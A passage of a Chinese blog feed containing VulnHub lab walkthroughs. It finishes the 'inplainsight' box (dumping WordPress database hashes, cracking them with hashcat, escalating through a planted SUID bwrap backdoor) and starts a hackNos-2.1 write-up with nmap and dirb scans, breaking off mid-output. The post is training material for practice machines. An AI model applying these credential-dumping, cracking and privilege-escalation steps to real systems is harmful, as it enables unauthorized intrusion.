class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( ! defined( &#x27;</span>ABSPATH<span class="string">&#x27; ) ) &#123;</span></span><br><span class="line"><span class="string">        define( &#x27;</span>ABSPATH<span class="string">&#x27;, dirname( __FILE__ ) . &#x27;</span>/<span class="string">&#x27; );</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once( ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27; );</span></span><br></pre></td></tr></table></figure>

<p>现在有了数据库用户名和密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/** The name of the database <span class="keyword">for</span> WordPress */</span><br><span class="line">define( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;sodevwp&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;sodevwp&#x27;</span> );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;oZ2R3c2x7dLL6#hJ&#x27;</span> );</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ mysql -usodevwp -poZ2R3c2x7dLL6<span class="comment">#hJ</span></span><br><span class="line">&lt;o-dev-wordpress$ mysql -usodevwp -poZ2R3c2x7dLL6<span class="comment">#hJ  </span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 9805</span><br><span class="line">Server version: 10.3.20-MariaDB-0ubuntu0.19.10.1 Ubuntu 19.10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| sodevwp            |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use sodevwp;</span><br><span class="line">use sodevwp;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [sodevwp]&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+----------------------------+</span><br><span class="line">| Tables_in_sodevwp          |</span><br><span class="line">+----------------------------+</span><br><span class="line">| sodevwp_commentmeta        |</span><br><span class="line">| sodevwp_comments           |</span><br><span class="line">| sodevwp_links              |</span><br><span class="line">| sodevwp_options            |</span><br><span class="line">| sodevwp_postmeta           |</span><br><span class="line">| sodevwp_posts              |</span><br><span class="line">| sodevwp_term_relationships |</span><br><span class="line">| sodevwp_term_taxonomy      |</span><br><span class="line">| sodevwp_termmeta           |</span><br><span class="line">| sodevwp_terms              |</span><br><span class="line">| sodevwp_usermeta           |</span><br><span class="line">| sodevwp_users              |</span><br><span class="line">+----------------------------+</span><br><span class="line">12 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [sodevwp]&gt; select * from sodevwp_users;</span><br><span class="line">select * from sodevwp_users;</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">| ID | user_login | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">|  1 | admin      | <span class="variable">$P</span><span class="variable">$BD</span>/ZmfBIhgjHKtkLpPKfhr2t5EDgZA. | admin         | admin@local.lan |          | 2019-11-22 03:41:57 |                     |           0 | admin        |</span><br><span class="line">|  2 | mike       | <span class="variable">$P</span><span class="variable">$B3halPOgh4jqI1tDelkv5TGAHnaOC01</span> | mike          | mike@local.lan  |          | 2019-11-22 03:44:25 |                     |           0 | mike         |</span><br><span class="line">+----+------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+--------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>成功使用上述命令后，将发现以下两个hash值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$P</span><span class="variable">$BD</span>/ZmfBIhgjHKtkLpPKfhr2t5EDgZA.(admin)</span><br><span class="line"><span class="variable">$P</span><span class="variable">$B3halPOgh4jqI1tDelkv5TGAHnaOC01</span>(mike)</span><br></pre></td></tr></table></figure>

<p>将2条hash值保存后，用hashcat破解如下所示，电脑是GTX-1070 8GB显存的显卡，一秒出密码，非常给力，比用john破解快多了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\hashcat-5.1.0\hashcat-5.1.0&gt;hashcat64.exe -a 0 -m 400 password.txt D:/wordlists/rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">* Device <span class="comment">#3: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#1: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#2: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#3: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">Hashes: 2 digests; 2 unique digests, 2 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: D:/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344360</span><br><span class="line">* Bytes.....: 139921318</span><br><span class="line">* Keyspace..: 14344360</span><br><span class="line"></span><br><span class="line"><span class="variable">$P</span><span class="variable">$B3halPOgh4jqI1tDelkv5TGAHnaOC01</span>:skuxdelux</span><br><span class="line"><span class="variable">$P</span><span class="variable">$BD</span>/ZmfBIhgjHKtkLpPKfhr2t5EDgZA.:admin1</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)</span><br><span class="line">Hash.Target......: password.txt</span><br><span class="line">Time.Started.....: Mon Jan 13 11:20:12 2020 (2 secs)</span><br><span class="line">Time.Estimated...: Mon Jan 13 11:20:14 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (D:/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#3.........:  1199.8 kH/s (6.61ms) @ Accel:512 Loops:128 Thr:64 Vec:1</span></span><br><span class="line">Recovered........: 2/2 (100.00%) Digests, 2/2 (100.00%) Salts</span><br><span class="line">Progress.........: 1048576/28688720 (3.66%)</span><br><span class="line">Rejected.........: 0/1048576 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344360 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:1 Amplifier:0-1 Iteration:8064-8192</span></span><br><span class="line">Candidates.<span class="comment">#3....: 123456 -&gt; chadj85</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Mon Jan 13 11:20:09 2020</span><br><span class="line">Stopped: Mon Jan 13 11:20:15 2020</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub154.jpg"></p>
<p>得到两个密码：<br>admin/admin1<br>mike/skuxdelux</p>
<p>现在，将用户切换为Mike，可以如下观察到可以成功完成操作,这意味着破解密码成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ su admin</span><br><span class="line">su admin</span><br><span class="line">su: user admin does not exist</span><br><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ </span><br><span class="line"></span><br><span class="line">www-data@inplainsight:/var/www/html/so-dev-wordpress$ su mike</span><br><span class="line">su mike</span><br><span class="line">Password: skuxdelux</span><br><span class="line"></span><br><span class="line">mike@inplainsight:/var/www/html/so-dev-wordpress$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(mike) gid=1000(mike) groups=1000(mike)</span><br><span class="line">mike@inplainsight:/var/www/html/so-dev-wordpress$ whoami</span><br><span class="line">whoami</span><br><span class="line">mike</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>继续进行特权升级。现在，当您将目录更改为/home时，会发现一个新用户“joe”并且不浪费任何时间，我们遍历了/etc/passwd。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@inplainsight:~$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:108:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/<span class="literal">false</span></span><br><span class="line">mike:x:1000:1000:mike,,,:/home/mike:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">postfix:x:112:120::/var/spool/postfix:/usr/sbin/nologin</span><br><span class="line">ftp:x:113:122:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">joe:x:1001:1001:hyphens rule:/home/joe:/bin/bash</span><br></pre></td></tr></table></figure>

<p>没有发现joe用户的密码，继续遍历passwd-</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@inplainsight:/etc$ cat passwd-</span><br><span class="line">cat passwd-</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:108:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:110:1::/var/cache/pollinate:/bin/<span class="literal">false</span></span><br><span class="line">mike:x:1000:1000:mike,,,:/home/mike:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">postfix:x:112:120::/var/spool/postfix:/usr/sbin/nologin</span><br><span class="line">ftp:x:113:122:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span><br><span class="line">joe:x:1001:1001:joe:SmashMouthNoThanks:/home/joe:/bin/bash</span><br></pre></td></tr></table></figure>

<p>得到用户密码:joe/SmashMouthNoThanks，然后切换到joe用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mike@inplainsight:/etc$ su joe</span><br><span class="line">su joe</span><br><span class="line">Password: SmashMouthNoThanks</span><br><span class="line"></span><br><span class="line">joe@inplainsight:/etc$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(joe) gid=1001(joe) groups=1001(joe)</span><br><span class="line">joe@inplainsight:/etc$ whoami</span><br><span class="line">whoami</span><br><span class="line">joe</span><br><span class="line">joe@inplainsight:/$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">joe@inplainsight:/home$ ls</span><br><span class="line">ls</span><br><span class="line">joe  mike</span><br><span class="line">joe@inplainsight:/home$ <span class="built_in">cd</span> joe</span><br><span class="line"><span class="built_in">cd</span> joe</span><br><span class="line">joe@inplainsight:~$ ls  </span><br><span class="line">ls</span><br><span class="line">journal</span><br><span class="line">joe@inplainsight:~$ cat journal</span><br><span class="line">cat journal</span><br><span class="line">glad i added that root backdoor before boss person removed my privileges :)</span><br></pre></td></tr></table></figure>

<p>意思是，系统中已经有别人先添加好的后门了,要做的唯一一件事就是获取目标的最后一个flag。为了得到它，我们使用命令find查找SUID。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>在执行此命令之前，我们将目录更改为“/”，并在运行该命令后找到以下有用的二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joe@inplainsight:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/bwrap</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure>

<p>在/bwrap中，找到了最后一个flag，如下图：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joe@inplainsight:~$ bwrap</span><br><span class="line">bwrap</span><br><span class="line">root@inplainsight:~<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(joe)</span><br><span class="line">root@inplainsight:~<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@inplainsight:~<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@inplainsight:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line">root@inplainsight:/root<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line"></span><br><span class="line">                                          __          </span><br><span class="line">  ____  ____   ____    ________________ _/  |_  ______</span><br><span class="line">_/ ___\/  _ \ /    \  / ___\_  __ \__  \\   __\/  ___/</span><br><span class="line">\  \__(  &lt;_&gt; )   |  \/ /_/  &gt;  | \// __ \|  |  \___ \ </span><br><span class="line"> \___  &gt;____/|___|  /\___  /|__|  (____  /__| /____  &gt;</span><br><span class="line">     \/           \//_____/            \/          \/ </span><br><span class="line"></span><br><span class="line">easy right? thanks <span class="keyword">for</span> playing.</span><br><span class="line"></span><br><span class="line">feel free to leave feedback with me @bzyo_</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub155.jpg"></p>
<p>成功提权，帅的一批。。。</p>
<ul>
<li>知识点：wordpress文件上传</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[hackNos-Os-hackNos-2-1]</title>
    <url>/2019/12/19/hackNos-Os-hackNos-2-1/</url>
    <content><![CDATA[<p>名称：hackNos：Os-hackNos-2.1<br>发布日期：29 Nov 2019</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MVVzemZxb29tbTdpdl9jNGFpdU5iNlVQbDhaZ2Z2NThz">https://drive.google.com/open?id=1Uszfqoomm7iv_c4aiuNb6UPl8Zgfv58s<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMi4xLm92YQ==">https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbm9zL09zLWhhY2tOb3MtMi4xLm92YS50b3JyZW50">https://download.vulnhub.com/hacknos/Os-hackNos-2.1.ova.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>难度：容易中级</p>
<p>flag：2个flag第一个user和第二个root</p>
<p>学习：Web应用程序 枚举 密码破解</p>
<a id="more"></a>

<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>由于此靶机使用virtualbox导出的ova文件，无法适应vmware的网络配置，故将靶机放在vbox中，而攻击机kali放在vmware中，网络如下图配置方能让两台机器相互通信</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub71.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub72.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub73.jpg"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:89:DE:B1 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.56.101</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /tsweb/: Remote Desktop Web Connection</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br></pre></td></tr></table></figure>

<p>开了2个端口，然后dirb目录扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.101/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Dec 19 00:38:44 2019</span><br><span class="line">URL_BASE: http://192.168.56.101/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.101/ ----</span><br><span class="line">+ http://192.168.56.101/index.html (CODE:200|SIZE:10918)                                              </span><br><span class="line">+ http://192.168.56.101/server-status (CODE:403|SIZE:279)                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/                                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/index.php (CODE:301|SIZE:0)                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-includes/                                               </span><br><span class="line">+ http://192.168.56.101/tsweb/xmlrpc.php (CODE:405|SIZE:42)                                           </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-admin/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/admin.php (CODE:302|SIZE:0)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/css/                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/images/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/includes/                                         </span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/index.php (CODE:302|SIZE:0)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/js/                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/maint/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/network/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-admin/user/                                             </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-content/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-content/index.php (CODE:200|SIZE:0)                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/plugins/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/themes/                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/upgrade/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.101/tsweb/wp-content/uploads/                                   </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/network/admin.php (CODE:302|SIZE:0)                            </span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/network/index.php (CODE:302|SIZE:0)                            </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/user/admin.php (CODE:302|SIZE:0)                               </span><br><span class="line">+ http://192.168.56.101/tsweb/wp-admin/user/index.php (CODE:302|SIZE:0)                               </span><br><span class="line">                                                                                                      </span><br><span class="line">---- Entering directory: http://192.168.56.101/tsweb/wp-content/plugins/ 